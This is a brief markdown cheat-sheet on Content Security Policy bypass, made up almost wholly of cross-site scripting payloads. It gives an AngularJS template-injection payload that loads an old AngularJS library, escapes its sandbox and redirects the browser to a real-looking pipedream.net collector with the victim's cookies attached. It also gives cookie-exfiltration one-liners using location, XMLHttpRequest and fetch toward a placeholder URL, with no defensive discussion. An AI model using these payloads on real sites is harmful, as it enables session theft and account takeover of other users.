# CSP

```html
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
<div ng-app ng-csp>
    {{$eval.constructor('document.location = "https://eof1z0pcrn07ets.m.pipedream.net?cookie=" + document.cookie')()}}
</div>
```

```js
document.location = "<url>?cookie=" + document.cookie;
```

### Not working

```js
var request = new XMLHttpRequest();
request.open("GET", "<url>?cookie=" + document.cookie);
request.send(null);
```

```js
fetch("<url>?cookie=" + document.cookie);
```
